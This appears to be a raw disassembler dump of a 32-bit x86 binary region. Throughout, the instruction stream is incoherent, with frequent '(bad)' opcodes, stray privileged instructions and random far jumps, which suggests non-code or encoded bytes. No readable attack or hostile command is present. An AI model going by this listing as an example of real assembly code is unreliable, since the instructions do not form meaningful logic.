  41aedd:	inc    ebx
  41aede:	popa   
  41aedf:	jae    0x41af55
  41aee1:	outs   dx,DWORD PTR ds:[esi]
  41aee2:	push   esi
  41aee3:	sbb    al,0x5b
  41aee5:	pop    edx
  41aee6:	pop    ds
  41aee7:	cmp    DWORD PTR [esi+edx*2+0x43450d1c],0x24b64a25
  41aef2:	sbb    DWORD PTR [ecx-0x29],ebp
  41aef5:	pop    ebx
  41aef6:	js     0x41aece
  41aef8:	pop    eax
  41aefa:	sbb    BYTE PTR [eax-0x35],bh
  41aefd:	adc    BYTE PTR [ebp+0x41],al
  41af00:	arpl   WORD PTR [edi-0xa45098e],ax
  41af06:	jae    0x41af7b
  41af08:	push   esi
  41af09:	mov    BYTE PTR [ecx+eiz*2-0x73],ch
  41af0d:	mov    ebx,0xd20578d8
  41af12:	push   eax
  41af13:	fsubr  DWORD PTR [ebx]
  41af15:	push   eax
  41af16:	jb     0x41af3a
  41af18:	mov    ecx,0x6c78ed2d
  41af1d:	gs jecxz 0x41aeb0
  41af20:	push   edi
  41af21:	push   edi
  41af22:	xor    bh,bl
  41af24:	pusha  
  41af25:	add    al,0xf2
  41af27:	push   edi
  41af28:	xor    BYTE PTR [edi+0x63617453],ch
  41af2e:	inc    ebx
  41af2f:	leave  
  41af30:	aaa    
  41af31:	mov    WORD PTR [ebx-0x80],gs
  41af34:	pop    ebx
  41af35:	mov    WORD PTR [ecx+eiz*4+0x43020561],cs
  41af3c:	outs   dx,DWORD PTR ds:[esi]
  41af3d:	je     0x41afa9
  41af3f:	xchg   BYTE PTR [edx+0x436c70cd],dl
  41af45:	imul   edx,DWORD PTR [edi-0x1c],0xffffffe4
  41af49:	xchg   edi,eax
  41af4a:	cld    
  41af4b:	sub    edx,DWORD PTR [eax]
  41af4d:	(bad)  
  41af4e:	push   esi
  41af4f:	popa   
  41af50:	jb     0x41afbb
  41af52:	popa   
  41af53:	outs   dx,BYTE PTR ds:[esi]
  41af54:	pop    eax
  41af55:	inc    esi
  41af56:	and    BYTE PTR [edi],ch
  41af58:	mov    dl,0x40
  41af5a:	pop    ebx
  41af5b:	pop    eax
  41af5c:	inc    eax
  41af5d:	fsub   st,st(0)
  41af5f:	sub    BYTE PTR [eax],bl
  41af61:	mov    esp,0x6146c122
  41af67:	inc    ebx
  41af68:	leave  
  41af69:	jbe    0x41afd3
  41af6b:	outs   dx,BYTE PTR ds:[esi]
  41af6c:	fs (bad) 
  41af6e:	pop    edi
  41af6f:	mov    al,ds:0x472c6ca0
  41af74:	and    BYTE PTR [esi],cl
  41af76:	(bad)  
  41af77:	fdiv   DWORD PTR [edx-0x5f]
  41af7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af7b:	cmp    ebp,DWORD PTR [ebx]
  41af7d:	jb     0x41af3b
  41af7f:	nop
  41af80:	pop    ebx
  41af81:	cld    
  41af82:	push   ebx
  41af83:	add    ebp,DWORD PTR [ebx]
  41af85:	nop
  41af86:	cld    
  41af87:	stos   DWORD PTR es:[edi],eax
  41af88:	data16 cmp BYTE PTR [esi+0x24],bl
  41af8c:	icebp  
  41af8d:	mov    al,0x5b
  41af8f:	pop    ecx
  41af90:	pop    eax
  41af91:	(bad)  
  41af92:	pop    ecx
  41af93:	pop    eax
  41af94:	les    esi,FWORD PTR [esi-0x5cf7bf72]
  41af9a:	push   ebx
  41af9b:	push   ebp
  41af9c:	mov    al,0xa1
  41af9e:	cmp    ecx,DWORD PTR fs:[edi]
  41afa1:	push   edi
  41afa2:	mov    al,0xb0
  41afa4:	mov    bl,0x21
  41afa6:	call   DWORD PTR [edx]
  41afa8:	and    eax,edi
  41afaa:	push   ebx
  41afab:	popa   
  41afac:	data16 arpl WORD PTR gs:[ecx+0x6c],sp
  41afb1:	cmp    DWORD PTR [ecx-0x37a6c01e],esp
  41afb7:	adc    DWORD PTR [ebx],eax
  41afb9:	cs aaa 
  41afbb:	xor    al,0x4
  41afbd:	aaa    
  41afbe:	dec    eax
  41afbf:	fwait
  41afc0:	loope  0x41af78
  41afc2:	sbb    al,0x0
  41afc4:	or     BYTE PTR [ebp+0x22],dl
  41afc7:	ins    BYTE PTR es:[edi],dx
  41afc8:	jae    0x41afbd
  41afca:	and    ebp,esp
  41afcc:	sbb    DWORD PTR [eax-0x70],ebp
  41afcf:	xor    al,0x38
  41afd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afd2:	inc    edx
  41afd3:	pop    ecx
  41afd4:	arpl   WORD PTR [edi],cx
  41afd6:	icebp  
  41afd7:	and    al,0x18
  41afd9:	pop    edx
  41afda:	(bad)  
  41afdb:	dec    BYTE PTR [ecx]
  41afdd:	xor    dl,bl
  41afdf:	pop    ds
  41afe0:	inc    esp
  41afe1:	dec    ebx
  41afe2:	test   al,0x20
  41afe4:	adc    edx,DWORD PTR [esp+edx*2+0x68]
  41afe8:	jb     0x41af9a
  41afea:	jno    0x41af94
  41afec:	test   ebp,esp
  41afee:	fs (bad) 
  41aff0:	loop   0x41b067
  41aff2:	jns    0x41afaa
  41aff4:	mov    ds:0x83cc033f,eax
  41aff9:	rcl    ah,0xc2
  41affc:	stos   DWORD PTR es:[edi],eax
  41affd:	xchg   esp,eax
  41affe:	pop    es
  41afff:	lods   al,BYTE PTR ds:[esi]
  41b000:	add    al,0xd
  41b002:	adc    eax,0x98aa3d83
  41b007:	pop    ss
  41b008:	inc    esp
  41b009:	out    0xd4,eax
  41b00b:	cs jb  0x41afd6
  41b00e:	and    esp,edx
  41b010:	aam    0x7f
  41b012:	call   0xa303:0x99ba69a6
  41b019:	lods   eax,DWORD PTR ds:[esi]
  41b01a:	jns    0x41af9d
  41b01c:	mov    esi,edi
  41b01e:	jg     0x41b009
  41b020:	imul   edx,DWORD PTR [ecx+0x7b7552c3],0xffffff8f
  41b027:	sbb    eax,0xdf9c4cdb
  41b02c:	push   edi
  41b02d:	loopne 0x41b0a0
  41b02f:	sbb    DWORD PTR ds:0x93bac23f,edi
  41b035:	in     eax,dx
  41b036:	pop    ss
  41b037:	mov    eax,0x405bbb2c
  41b03c:	paddq  mm3,mm3
  41b03f:	sub    bl,dh
  41b041:	lods   al,BYTE PTR ds:[esi]
  41b042:	mov    dh,0x1f
  41b044:	xor    BYTE PTR [ecx+0x5b],cl
  41b047:	clc    
  41b048:	pop    es
  41b049:	adc    dh,bl
  41b04b:	stos   BYTE PTR es:[edi],al
  41b04c:	adc    BYTE PTR [esp+edx*2],ah
  41b04f:	dec    ebp
  41b050:	jne    0x41b0be
  41b052:	ds push edx
  41b054:	ficom  WORD PTR [esi-0x46]
  41b057:	jne    0x41afdc
  41b059:	nop
  41b05a:	ins    BYTE PTR es:[edi],dx
  41b05b:	jne    0x41b0d0
  41b05d:	je     0x41b0c4
  41b05f:	push   edi
  41b060:	ins    BYTE PTR es:[edi],dx
  41b061:	loope  0x41b0cd
  41b063:	pop    ss
  41b064:	fiadd  DWORD PTR [ebp-0xa9c91aa]
  41b06a:	popf   
  41b06b:	imul   edi,DWORD PTR [edx-0x14],0x2cc54bfd
  41b072:	addr16 sub al,dl
  41b075:	shr    edx,0x10
  41b078:	div    bx
  41b07b:	js     0x41b04e
  41b07d:	not    BYTE PTR [esi]
  41b07f:	xor    al,0x66
  41b081:	mov    DWORD PTR [ecx],eax
  41b083:	add    dl,BYTE PTR [ebx]
  41b085:	pop    ds
  41b086:	mov    esp,0x5083c573
  41b08b:	addr16 pop es
  41b08d:	retf   
  41b08e:	mov    dl,0x1
  41b090:	mov    eax,ds:0xc22ed43
  41b095:	(bad)  
  41b096:	mov    edi,0x99bcac93
  41b09b:	sub    cl,BYTE PTR [eax+0x41]
  41b09e:	push   0x3b150c6b
  41b0a3:	mov    BYTE PTR [edi-0x53],al
  41b0a6:	js     0x41b0db
  41b0a8:	leave  
  41b0a9:	lds    ebp,FWORD PTR [eax+0x23d4e085]
  41b0af:	(bad)  
  41b0b0:	daa    
  41b0b1:	inc    esi
  41b0b2:	mov    al,ds:0xfaaf4677
  41b0b7:	sbb    al,0x89
  41b0b9:	fcomp  DWORD PTR [ebp+0x5]
  41b0bc:	ret    
  41b0bd:	sub    dl,dl
  41b0bf:	cmp    al,BYTE PTR [edi]
  41b0c1:	push   0x23
  41b0c3:	dec    esp
  41b0c4:	add    DWORD PTR [ebx-0x5c],eax
  41b0c7:	and    DWORD PTR [edx],eax
  41b0c9:	(bad)  
  41b0ca:	lods   eax,DWORD PTR ds:[esi]
  41b0cb:	aaa    
  41b0cc:	outs   dx,BYTE PTR ds:[esi]
  41b0cd:	mov    al,BYTE PTR [eax]
  41b0cf:	cmp    al,0xf
  41b0d1:	push   es
  41b0d2:	cmp    al,0x7a
  41b0d4:	ja     0x41b0d8
  41b0d6:	sub    al,0x20
  41b0d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0d9:	jmp    0xff02:0x88e1bbb6
  41b0e0:	adc    al,0xff
  41b0e2:	pop    ds
  41b0e3:	dec    ebx
  41b0e4:	test   al,0xc
  41b0e6:	test   ebp,eax
  41b0e8:	test   al,0xdf
  41b0ea:	jp     0x41b13b
  41b0ec:	inc    ecx
  41b0ed:	and    dl,BYTE PTR [edx-0x38]
  41b0f0:	rcr    BYTE PTR [edx+0x4],cl
  41b0f3:	and    al,BYTE PTR [esi+0xa]
  41b0f6:	inc    esi
  41b0f7:	mov    edx,0xff091109
  41b0fc:	sub    eax,0x52f26fe2
  41b101:	cld    
  41b102:	mov    ecx,eax
  41b104:	cmp    ecx,edx
  41b106:	jbe    0x41b119
  41b108:	cmp    ecx,ecx
  41b10a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b10c:	je     0x41b116
  41b10e:	movzx  edx,BYTE PTR [ecx+0x19]
  41b112:	mov    bl,bl
  41b114:	inc    esi
  41b115:	inc    DWORD PTR [ebx]
  41b117:	push   edi
  41b118:	(bad)  
  41b119:	cli    
  41b11a:	add    bh,al
  41b11c:	push   eax
  41b11d:	(bad)  
  41b11e:	rcl    DWORD PTR [ebx+0x30],cl
  41b121:	sub    cl,BYTE PTR [edx+0x9bff5e]
  41b127:	pop    edx
  41b128:	imul   ecx,DWORD PTR [edx+0x8],0x4
  41b12c:	leave  
  41b12d:	dec    edi
  41b12e:	mov    bh,BYTE PTR [edi-0x25]
  41b131:	(bad)  
  41b132:	rep ins BYTE PTR es:[edi],dx
  41b134:	ud0    edi,edi
  41b137:	out    dx,eax
  41b138:	and    BYTE PTR [eax],bh
  41b13a:	sti    
  41b13b:	je     0x41b115
  41b13d:	push   eax
  41b13e:	ret    
  41b13f:	push   ebx
  41b140:	mov    edx,0xd77ce22d
  41b145:	sub    eax,edx
  41b147:	pop    ebx
  41b148:	cmp    BYTE PTR [ecx],bl
  41b14a:	push   eax
  41b14b:	pop    ss
  41b14c:	sbb    dh,BYTE PTR [ebp+0x21]
  41b14f:	call   0x3bd2c5a1
  41b154:	dec    edx
  41b155:	xchg   ebp,eax
  41b156:	test   DWORD PTR [edx+0x5c9e2972],ecx
  41b15c:	xchg   esp,eax
  41b15d:	cmp    edi,DWORD PTR [edx-0x14bf9f50]
  41b163:	hlt    
  41b164:	(bad)  
  41b165:	bound  ebx,QWORD PTR [eax]
  41b167:	ror    BYTE PTR [edi],1
  41b169:	mov    ah,0x8b
  41b16b:	ror    BYTE PTR [esi-0x4f],1
  41b16e:	sub    edx,ebx
  41b170:	and    eax,0xff5309a9
  41b175:	jg     0x41b1c3
  41b177:	cmp    BYTE PTR ds:0x8b409876,cl
  41b17d:	mov    esp,0x17c95032
  41b182:	add    DWORD PTR [edx-0x3cf011cf],0xffffffb5
  41b189:	xor    edi,DWORD PTR [ecx]
  41b18b:	xor    BYTE PTR [esp+edi*2],0xc
  41b18f:	dec    edx
  41b190:	mov    BYTE PTR [ecx+eax*4],cl
  41b193:	mov    ecx,0x37381302
  41b198:	add    DWORD PTR [ebp-0x297bc9c6],ecx
  41b19e:	and    DWORD PTR [ebp+0x78],ebx
  41b1a1:	inc    eax
  41b1a2:	imul   ebx,DWORD PTR [edi],0x16
  41b1a5:	lds    edx,FWORD PTR [eax+eax*8-0x77415ed]
  41b1ac:	stos   BYTE PTR es:[edi],al
  41b1ad:	mov    esp,0x3c047fff
  41b1b2:	lock mov ebx,0x3b4301da
  41b1b8:	repz jl 0x41b1c2
  41b1bb:	cmp    BYTE PTR [edi+ebx*1-0x1],0x20
  41b1c0:	jbe    0x41b1e6
  41b1c2:	call   0xb3628a2
  41b1c7:	jge    0x41b1d3
  41b1c9:	mov    eax,ebp
  41b1cb:	dec    edx
  41b1cc:	pop    ss
  41b1cd:	dec    esi
  41b1ce:	adc    al,0x63
  41b1d0:	test   DWORD PTR [edi-0x33],ebp
  41b1d3:	aaa    
  41b1d4:	clc    
  41b1d5:	xor    eax,0x41cb2bce
  41b1da:	fnstsw WORD PTR [eax]
  41b1dc:	xor    dl,BYTE PTR [edi]
  41b1de:	push   ds
  41b1df:	test   BYTE PTR [edx-0x36f774ec],cl
  41b1e5:	jne    0x41b212
  41b1e7:	sar    BYTE PTR [ecx-0x2d],0xff
  41b1eb:	sbb    eax,0x16f70ec4
  41b1f0:	pop    esi
  41b1f1:	cs mov al,0x2d
  41b1f4:	inc    ecx
  41b1f5:	dec    esi
  41b1f6:	mov    BYTE PTR [esi],al
  41b1f8:	ret    
  41b1f9:	mov    ecx,0xdfb75e0a
  41b1fe:	mov    dh,bh
  41b200:	push   esi
  41b201:	xor    edx,edx
  41b203:	div    ecx
  41b205:	dec    esi
  41b206:	inc    DWORD PTR [eax+0x3723afa]
  41b20c:	pop    es
  41b20d:	pop    es
  41b20e:	mov    bh,bh
  41b210:	pop    ss
  41b211:	ss test al,0x16
  41b214:	fsubp  st(2),st
  41b216:	in     al,dx
  41b217:	sub    ecx,esi
  41b219:	sub    edx,ecx
  41b21b:	jbe    0x41b22d
  41b21d:	add    ecx,edx
  41b21f:	mov    al,0x30
  41b221:	imul   edi,edi,0xffffffdd
  41b224:	jmp    FWORD PTR [ecx]
  41b226:	(bad)  
  41b227:	jmp    0x41b22c
  41b229:	mov    BYTE PTR [edx+esi*1],al
  41b22c:	dec    edx
  41b22d:	jne    0x41b229
  41b22f:	xor    eax,0x83e68956
  41b234:	in     al,dx
  41b235:	adc    BYTE PTR [ecx],dh
  41b237:	leave  
  41b238:	push   edx
  41b239:	aaa    
  41b23a:	dec    esp
  41b23b:	mov    BYTE PTR [eax],cl
  41b23d:	or     edx,eax
  41b23f:	lea    ebx,[eax+0x4d]
  41b242:	push   esp
  41b243:	ins    BYTE PTR es:[edi],dx
  41b244:	mov    al,0x5
  41b246:	sbb    DWORD PTR [esi+0x6b],ebx
  41b249:	xor    BYTE PTR [ecx-0x1e],bl
  41b24c:	inc    DWORD PTR [ecx+0x22d5bc0a]
  41b252:	push   DWORD PTR [eax+0x4]
  41b255:	push   DWORD PTR [eax]
  41b257:	mov    eax,esp
  41b259:	test   DWORD PTR [eax+0x35],0x53f20b47
  41b260:	pop    ss
  41b261:	inc    edx
  41b262:	cmc    
  41b263:	(bad)  
  41b264:	scas   eax,DWORD PTR es:[edi]
  41b265:	xchg   edx,eax
  41b266:	cmp    DWORD PTR [eax+0x4e2d26c6],edi
  41b26c:	inc    ecx
  41b26d:	outs   dx,DWORD PTR ds:[si]
  41b26f:	std    
  41b270:	mov    edi,0x45153b5
  41b275:	fnstcw WORD PTR [esp+0x2]
  41b279:	fnstcw WORD PTR [esp]
  41b27c:	or     WORD PTR [esi*4+0x472cd90f],0xbb0e
  41b286:	ins    BYTE PTR es:[edi],dx
  41b287:	or     BYTE PTR [ecx+0x2744e8d9],cl
  41b28d:	and    DWORD PTR [ebx+edi*8-0x79],0xda3a6aed
  41b295:	jg     0x41b2ff
  41b297:	add    al,0xff
  41b299:	fild   QWORD PTR [esp+0x8]
  41b29d:	fild   QWORD PTR [ebp*8-0x27822049]
  41b2a4:	ret    0xc1de
  41b2a7:	sub    bl,0x2
  41b2aa:	fild   QWORD PTR [eax]
  41b2ac:	fild   WORD PTR [esi+esi*1]
  41b2af:	ror    DWORD PTR [esi-0x27],0xf8
  41b2b3:	fild   QWORD PTR [esi+0x35]
  41b2b6:	fisub  DWORD PTR [ebp-0x75062320]
  41b2bc:	(bad)  [eax]
  41b2be:	cmp    al,0xd7
  41b2c0:	iret   
  41b2c1:	push   esp
  41b2c2:	(bad)  
  41b2c4:	mov    dh,0xd6
  41b2c6:	push   es
  41b2c7:	push   ss
  41b2c8:	fcom   st(3)
  41b2ca:	fstsw  ax
  41b2cd:	sahf   
  41b2ce:	jae    0x41b2b1
  41b2d0:	fnstenv ds:0xfd9e5c02
  41b2d6:	das    
  41b2d7:	(bad)  
  41b2d8:	ffree  st(3)
  41b2da:	ffree  st(2)
  41b2dc:	ffree  st(1)
  41b2de:	ffree  st(0)
  41b2e0:	pop    ecx
  41b2e1:	jmp    0xd8cb:0xd101d629
  41b2e8:	mov    DWORD PTR [esi+0x5020eee3],edx
  41b2ee:	pop    edi
  41b2ef:	repnz xor eax,0xf108ef50
  41b2f5:	test   BYTE PTR [eax],ah
  41b2f7:	pop    esi
  41b2f8:	pop    ebp
  41b2f9:	pusha  
  41b2fa:	mov    BYTE PTR [eax+0x10],ch
  41b2fd:	push   ds
  41b2fe:	ja     0x41b2e1
  41b300:	shl    DWORD PTR [ebx+0x20027bb6],0x2b
  41b307:	push   ecx
  41b308:	mov    ecx,0x8a3a1b5a
  41b30d:	xchg   ecx,eax
  41b30e:	and    DWORD PTR [eax],esp
  41b310:	push   ebx
  41b311:	es aam 0x28
  41b314:	push   ds
  41b315:	ror    BYTE PTR [ecx+0x319d82f8],0xce
  41b31c:	fimul  DWORD PTR [edi]
  41b31e:	pop    edx
  41b31f:	adc    edx,DWORD PTR [ecx+0x8]
  41b322:	aam    0xc
  41b324:	or     bh,al
  41b326:	fistp  DWORD PTR [ecx+ecx*4]
  41b329:	push   es
  41b32a:	push   ds
  41b32b:	or     al,0xb
  41b32d:	icebp  
  41b32e:	and    BYTE PTR [esi],ch
  41b330:	shl    ch,1
  41b332:	push   edi
  41b333:	cmp    BYTE PTR [edi+edi*4-0x78],0xb7
  41b338:	shl    eax,1
  41b33a:	sub    DWORD PTR [edi-0x48],eax
  41b33d:	pmuludq mm1,QWORD PTR [ebx+0x414d7315]
  41b344:	pop    es
  41b345:	pinsrw mm7,WORD PTR [eax-0x6d82fcc],0x1e
  41b34d:	jne    0x41b36a
  41b34f:	mov    edx,0x11546011
  41b354:	test   BYTE PTR ss:[esi],cl
  41b357:	in     al,0x92
  41b359:	and    DWORD PTR [eax+ebp*8+0x14562184],eax
  41b360:	jns    0x41b3c6
  41b362:	sbb    esi,DWORD PTR [edi-0x1a]
  41b365:	mov    eax,DWORD PTR [ecx]
  41b367:	lock push esp
  41b369:	jb     0x41b31a
  41b36b:	syscall 
  41b36d:	or     bl,BYTE PTR [esi-0x7d]
  41b370:	push   ss
  41b371:	sbb    BYTE PTR [ebp+0x10],bl
  41b374:	cmp    bl,0xdb
  41b377:	(bad)  
  41b378:	or     edx,DWORD PTR [edi-0x3a]
  41b37b:	inc    ebp
  41b37c:	dec    DWORD PTR [ecx-0xe]
  41b37f:	test   esi,esi
  41b381:	jl     0x41b3a3
  41b383:	inc    esi
  41b384:	mov    esp,0xd16e5b1d
  41b389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b38a:	fisttp WORD PTR [ebx-0x4fa2e9ed]
  41b390:	push   es
  41b391:	sbb    eax,0xba01f68e
  41b396:	add    ebx,ebp
  41b398:	push   es
  41b399:	xor    ah,bl
  41b39b:	mov    cl,BYTE PTR [ebx]
  41b39d:	mov    al,BYTE PTR [ecx+0x2a]
  41b3a0:	js     0x41b3a2
  41b3a2:	stos   DWORD PTR es:[edi],eax
  41b3a3:	stos   DWORD PTR es:[edi],eax
  41b3a4:	sbb    eax,0xdaaadea3
  41b3a9:	bound  ecx,QWORD PTR [ebp+0x7143f055]
  41b3af:	js     0x41b38c
  41b3b1:	fild   WORD PTR [eax]
  41b3b3:	sub    BYTE PTR [edi+0x6ddb1198],dl
  41b3b9:	lock fcomp DWORD PTR ds:0xbb26615f
  41b3c0:	sti    
  41b3c1:	xchg   BYTE PTR [eax],ch
  41b3c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3c4:	setne  BYTE PTR [ebx]
  41b3c7:	jmp    0x41b412
  41b3c9:	sbb    ebx,DWORD PTR [edi-0x28]
  41b3cc:	push   ebp
  41b3cd:	jmp    DWORD PTR [eax-0x25]
  41b3d0:	arpl   WORD PTR [edi],bx
  41b3d2:	(bad)  
  41b3d3:	or     esp,DWORD PTR es:[eax+0x68]
  41b3d7:	pop    ecx
  41b3d8:	xor    eax,DWORD PTR ds:0x216603c6
  41b3de:	add    esi,DWORD PTR [edx]
  41b3e0:	and    BYTE PTR [ebx+0x22],ah
  41b3e3:	test   BYTE PTR [ebx+eax*1+0x2b602cd8],al
  41b3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3eb:	ret    0xcf7f
  41b3ee:	xor    ebx,DWORD PTR gs:[eax+0x73]
  41b3f2:	add    DWORD PTR [eax],esi
  41b3f4:	or     eax,DWORD PTR [edx]
  41b3f6:	sub    eax,0x2bac4131
  41b3fb:	dec    ebp
  41b3fc:	(bad)  
  41b3fd:	icebp  
  41b3fe:	xor    DWORD PTR [edi+esi*2],ebp
  41b401:	loope  0x41b3ba
  41b403:	push   eax
  41b404:	pop    ebx
  41b405:	xlat   BYTE PTR ds:[ebx]
  41b406:	adc    edx,edi
  41b408:	adc    eax,0x1b128b71
  41b40d:	and    DWORD PTR [eax],0x24eb1d83
  41b413:	adc    BYTE PTR [ebx+edx*8-0x3ea92d13],al
  41b41a:	inc    edi
  41b41b:	mov    dh,BYTE PTR [edx+0x14]
  41b41e:	xchg   ebp,eax
  41b41f:	push   ss
  41b420:	aas    
  41b421:	stos   DWORD PTR es:[edi],eax
  41b422:	(bad)  
  41b423:	fadd   DWORD PTR [ecx+0x2c]
  41b426:	adc    al,0x3b
  41b428:	clc    
  41b429:	or     eax,0xffffffff
  41b42c:	or     eax,0x8bffd2f7
  41b431:	repz and esi,0x3
  41b435:	cmp    esi,0x2
  41b438:	ja     0x41b479
  41b43a:	cwde   
  41b43b:	and    edx,0xd02f6bf0
  41b441:	ss test bl,ch
  41b444:	inc    eax
  41b445:	ja     0x41b479
  41b447:	inc    esi
  41b448:	jl     0x41b4b4
  41b44a:	add    ecx,DWORD PTR [eax]
  41b44c:	push   0x3b55af50
  41b451:	push   ss
  41b452:	push   eax
  41b453:	push   esi
  41b454:	mov    bl,0xed
  41b456:	push   ss
  41b457:	test   BYTE PTR [ebp+0x7504045],al
  41b45d:	mov    ch,0x34
  41b45f:	cmp    esi,DWORD PTR [ebp-0x38365137]
  41b465:	mov    ds:0x8fa0984a,eax
  41b46a:	addr16 add al,0x87
  41b46d:	cmp    DWORD PTR [edx],eax
  41b46f:	rol    BYTE PTR [eax],0xc0
  41b472:	aaa    
  41b473:	adc    al,0x1f
  41b475:	mov    ds:0x61fb2664,al
  41b47a:	in     al,0xc
  41b47c:	push   0x6
  41b47e:	and    edx,edi
  41b480:	push   ecx
  41b481:	nop
  41b482:	sub    DWORD PTR [esi],esi
  41b484:	cmp    ebx,DWORD PTR [edx]
  41b486:	aad    0xa7
  41b488:	cmovnp esp,DWORD PTR [eax+0x7]
  41b48c:	(bad)  
  41b48d:	sahf   
  41b48e:	or     esp,eax
  41b490:	xchg   ebp,eax
  41b491:	sbb    edi,ebx
  41b493:	jns    0x41b4ed
  41b495:	inc    ecx
  41b496:	add    BYTE PTR [ecx],bh
  41b498:	ret    0x982b
  41b49b:	fldcw  WORD PTR [edx]
  41b49d:	pop    eax
  41b49e:	inc    edx
  41b49f:	xchg   ebx,eax
  41b4a0:	popf   
  41b4a1:	or     BYTE PTR [esp+edx*4],dl
  41b4a4:	stos   BYTE PTR es:[edi],al
  41b4a5:	loope  0x41b4b3
  41b4a7:	iret   
  41b4a8:	push   esi
  41b4a9:	cmp    BYTE PTR [eax],0x1
  41b4ac:	(bad)  
  41b4ad:	in     al,dx
  41b4ae:	push   0x39
  41b4b0:	xor    BYTE PTR [edx*2+0x2874ec6c],0x0
  41b4b8:	sub    DWORD PTR [edi+0x4ac380],ebx
  41b4be:	pop    ds
  41b4bf:	pop    eax
  41b4c0:	mov    cl,0xe8
  41b4c2:	test   al,0x1
  41b4c4:	dec    edx
  41b4c5:	pop    eax
  41b4c6:	add    al,cl
  41b4c8:	and    BYTE PTR [ebx-0x65fe40b7],ch
  41b4ce:	sbb    DWORD PTR [eax],eax
  41b4d0:	and    eax,0x297eff56
  41b4d5:	mov    bl,BYTE PTR [esi+edi*1+0x3e]
  41b4d9:	add    al,0xae
  41b4db:	xchg   bh,bh
  41b4dd:	xchg   ebx,eax
  41b4de:	sbb    al,0xdf
  41b4e0:	push   0x64
  41b4e2:	fdiv   st(5),st
  41b4e4:	(bad)  
  41b4e5:	add    BYTE PTR ds:[edi],bl
  41b4e8:	xlat   BYTE PTR ds:[ebx]
  41b4e9:	cs fwait
  41b4eb:	test   BYTE PTR [edx+eax*1],bh
  41b4ee:	jne    0x41b4f6
  41b4f0:	dec    edi
  41b4f1:	dec    edi
  41b4f2:	pusha  
  41b4f3:	xor    BYTE PTR [ebx-0x2880d748],al
  41b4f9:	mov    dl,0x3
  41b4fb:	cdq    
  41b4fc:	push   0x17
  41b4fe:	(bad)
  41b501:	add    BYTE PTR [ebx+0x1f],ah
  41b504:	scas   eax,DWORD PTR es:[edi]
  41b505:	or     eax,0xf05c12e0
  41b50a:	push   edi
  41b50b:	idiv   BYTE PTR [ecx+0x19e30140]
  41b511:	js     0x41b56f
  41b513:	and    al,0x29
  41b515:	pop    es
  41b516:	aam    0x4d
  41b518:	and    cl,dh
  41b51a:	pop    esp
  41b51b:	cmp    bh,BYTE PTR [ebx-0x75]
  41b51e:	push   esp
  41b51f:	pusha  
  41b520:	cs pusha 
  41b522:	adc    edx,DWORD PTR [esi-0x4c9897b0]
  41b528:	push   ebp
  41b529:	daa    
  41b52a:	push   0x97c8b863
  41b52f:	push   eax
  41b530:	or     al,0x89
  41b532:	mov    BYTE PTR [edx],ah
  41b534:	outs   dx,BYTE PTR ds:[esi]
  41b535:	rol    BYTE PTR [ecx],0x19
  41b538:	xchg   bl,bh
  41b53a:	push   ss
  41b53b:	icebp  
  41b53c:	push   edx
  41b53d:	cmp    eax,0x9dcba614
  41b542:	in     al,0xd2
  41b544:	dec    esi
  41b545:	or     BYTE PTR [esi-0x40],al
  41b548:	push   eax
  41b549:	jnp    0x41b571
  41b54b:	in     al,0x8a
  41b54d:	(bad)  
  41b54e:	pop    ds
  41b54f:	(bad)  
  41b550:	dec    eax
  41b551:	loopne 0x41b595
  41b553:	cld    
  41b554:	imul   DWORD PTR [ebp-0x8]
  41b557:	inc    esp
  41b558:	pop    edx
  41b559:	sub    eax,DWORD PTR [ecx+0x18]
  41b55c:	dec    ebp
  41b55d:	jecxz  0x41b583
  41b55f:	or     bl,BYTE PTR [edi]
  41b561:	mov    eax,ds:0xe856a068
  41b566:	jp     0x41b5a1
  41b568:	xor    al,0x8b
  41b56a:	dec    ebp
  41b56b:	xor    dl,BYTE PTR [ebx]
  41b56d:	les    ecx,FWORD PTR [ebx]
  41b56f:	pop    esp
  41b570:	add    DWORD PTR [ecx-0x49e645af],ecx
  41b576:	pop    esp
  41b577:	xor    eax,0x8b1f1099
  41b57c:	adc    BYTE PTR ds:0xf161ad14,dh
  41b582:	outs   dx,BYTE PTR ds:[esi]
  41b583:	inc    ebp
  41b584:	sbb    BYTE PTR [ebp-0x41],al
  41b587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b588:	enter  0xb48b,0xc7
  41b58c:	jmp    0x6dc2:0x5e5832ff
  41b593:	jae    0x41b54d
  41b595:	rcl    BYTE PTR [ebx+0x51d789c8],1
  41b59b:	adc    DWORD PTR [eax],edx
  41b59d:	mov    eax,ds:0x6a925068
  41b5a2:	ficom  DWORD PTR [edi]
  41b5a4:	and    ecx,0xcb88ea77
  41b5aa:	daa    
  41b5ab:	inc    esi
  41b5ac:	and    edx,ebx
  41b5ae:	and    bl,ch
  41b5b0:	add    eax,0x8507bd2
  41b5b5:	call   0x8a0cdfb8
  41b5ba:	test   DWORD PTR [ecx-0xc26be2a],0x45b38085
  41b5c4:	xchg   ebp,eax
  41b5c5:	fxtract 
  41b5c7:	xor    cl,BYTE PTR [eax+0x6]
  41b5ca:	hlt    
  41b5cb:	pop    ebx
  41b5cc:	pop    esi
  41b5cd:	pop    edi
  41b5ce:	ret    
  41b5cf:	repz in al,0x2
  41b5d2:	push   ds
  41b5d3:	adc    DWORD PTR ss:[esi-0x3a],ebx
  41b5d7:	pop    ecx
  41b5d8:	call   0xd433:0x8bf9738
  41b5df:	adc    ebx,DWORD PTR [edi-0x29]
  41b5e2:	mov    esi,eax
  41b5e4:	xor    eax,eax
  41b5e6:	or     edx,DWORD PTR [edi+edx*2-0x6a]
  41b5ea:	or     DWORD PTR [edi],ebp
  41b5ec:	pop    esp
  41b5ed:	(bad)  [ecx]
  41b5ef:	shl    BYTE PTR [ecx+edx*8+0x60],cl
  41b5f3:	adc    edi,ebp
  41b5f5:	and    DWORD PTR [edx-0x61833afa],ecx
  41b5fb:	gs mov edx,edi
  41b5fe:	push   edi
  41b5ff:	cli    
  41b600:	cli    
  41b601:	jmp    0xf04b:0xbc053520
  41b608:	je     0x41b5e5
  41b60a:	jo     0x41b633
  41b60c:	int3   
  41b60d:	mov    cl,0x3b
